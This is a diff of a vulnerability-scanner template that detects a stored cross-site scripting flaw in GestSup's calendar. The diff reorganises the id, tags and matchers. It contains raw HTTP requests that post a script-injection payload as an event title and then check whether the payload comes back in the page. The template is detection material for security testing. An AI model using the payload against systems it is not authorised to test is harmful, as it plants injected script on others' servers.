@@ -1,4 +1,4 @@
-id: CVE-2024-23167
+id: gestsup-xss
 info:
   name: GestSup - Cross-Site Scripting
   author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
@@ -16,25 +16,16 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
     cvss-score: 8.6
-    cve-id: CVE-2024-231637,CVE-2024-23167
   metadata:
     max-request: 3
     product: gestsup
     vendor: gestsup
-  tags: cve,cve2024,gestsup,vuln,xss
+  tags: gestsup,vuln,xss
 variables:
-  formatted_date: '{{date_time(''2006/01/02'')}}'
+  formatted_date: "{{date_time('2006/01/02')}}"
 flow: http(1) && http(2)
 http:
-  - matchers:
-      - condition: and
-        internal: true
-        part: response
-        type: word
-        words:
-          - '{"event_id":"'
-          - text/html
-    raw:
+  - raw:
       - |
         POST /ajax/calendar.php HTTP/1.1
         Host: {{Hostname}}
@@ -42,20 +33,15 @@ http:
         X-Requested-With: XMLHttpRequest
 
         action=add_event&title=<img/src/onerror=alert(document.domain)>&start={{formatted_date}} 07:30:00&end={{formatted_date}} 23:00:00&allday=false&technician=1
-  - matchers:
-      - condition: and
-        part: body
-        type: word
+    matchers:
+      - type: word
+        part: response
         words:
-          - view=activity
-          - ?page=calendar
-          - <img/src/onerror=alert(document.domain)>
-      - part: header
-        type: word
-        words:
-          - text/html
-    matchers-condition: and
-    raw:
+          - '{"event_id":"'
+          - 'text/html'
+        condition: and
+        internal: true
+  - raw:
       - |
         POST /index.php HTTP/1.1
         Host: {{Hostname}}
@@ -65,3 +51,17 @@ http:
       - |
         GET /index.php?page=calendar HTTP/1.1
         Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'view=activity'
+          - '?page=calendar'
+          - '<img/src/onerror=alert(document.domain)>'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - text/html
+        # digest: 4a0a0047304502205b4c75680ece5eeb977252c7f78d18f3baf523d059f049a5cbe905fafed86507022100c896a108125c4d0c3e3ee0cfbd66517d1ba71338acd8b09dbeb71f2472c2cc23:922c64590222798bb761d5b6d8e72950
